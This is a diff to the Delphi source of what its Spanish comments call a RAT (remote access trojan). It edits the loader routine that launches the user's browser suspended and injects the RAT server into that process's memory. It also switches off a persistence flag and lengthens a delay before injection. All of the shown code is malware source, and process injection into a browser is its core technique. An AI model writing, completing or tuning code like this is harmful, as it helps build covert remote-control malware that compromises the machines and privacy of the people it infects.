@@ -9,7 +9,7 @@ uses
   Servidor in 'Servidor.pas',
   Variables in 'Variables.pas',
   AfxCodeHook in 'AfxCodeHook.pas';
-
+{$R *.res}
 var
   PID: dword;
   i: Integer;
@@ -46,8 +46,7 @@ begin
       else
         Instalado := False;
 
-
-
+      Configuracion.bPersistencia := false;
       if (not Configuracion.bPersistencia) or (PID = 0) or (Instalado=false) then
         begin
         //como no está activada la persistencia, no estamos instalados o no esta ejecutandose explorer.exe yo me tengo que encargar de inyectar el rat
@@ -58,10 +57,11 @@ begin
             if (Mutex = 0) or (GetLastError <> 0) then exitprocess(0);
             ReleaseMutex(Mutex);
           end;
+
           ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
           StartInfo.cb := SizeOf(TStartupInfo);
           CreateProcess(PChar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
-          sleep(500); //le dejamos un rato...
+          sleep(5000); //le dejamos un rato...
           InjectarRAT('R', procInfo.dwProcessId); //inyectamos el servidor en memoria, ademas se encarga de esperar a que el rat lea la configuración
           ExitProcess(0);
         end
